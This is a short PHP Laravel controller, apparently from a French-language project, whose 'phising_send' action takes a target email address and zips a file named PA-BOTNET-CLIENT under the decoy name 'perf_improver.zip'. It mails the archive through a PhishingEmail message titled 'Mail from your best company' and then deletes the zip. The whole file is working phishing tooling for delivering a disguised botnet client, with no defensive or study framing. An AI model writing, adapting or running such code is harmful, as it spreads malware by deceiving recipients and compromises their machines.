<?php

namespace App\Http\Controllers;

use App\Mail\PhishingEmail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use ZipArchive;

class ToolsController extends Controller
{

    public function index()
    {

        return view('tools');

    }


    public function phising_send(Request $request)
    {

        $email = $request->email;

        $details = [
            'title' => 'Mail from your best company',
        ];

        $attachmentPath = storage_path('BOTNET-SHARE/PA-BOTNET-CLIENT');
        $zipFilePath = storage_path('BOTNET-SHARE/perf_improver.zip');; // Chemin du fichier zip

        $zip = new ZipArchive;

        if ($zip->open($zipFilePath, ZipArchive::CREATE) === TRUE) {
            $zip->addFile($attachmentPath, basename($attachmentPath));
            $zip->close();
        } else {
            return response()->json(['error' => 'Failed to create zip file'], 500);
        }


        Mail::to($email)->send(new PhishingEmail($details, $zipFilePath));


        if (file_exists($zipFilePath)) {
            unlink($zipFilePath);
        }

        return redirect('/quick_tools')->with('sucess', 'Email envoyé avec succès !');
    }

}
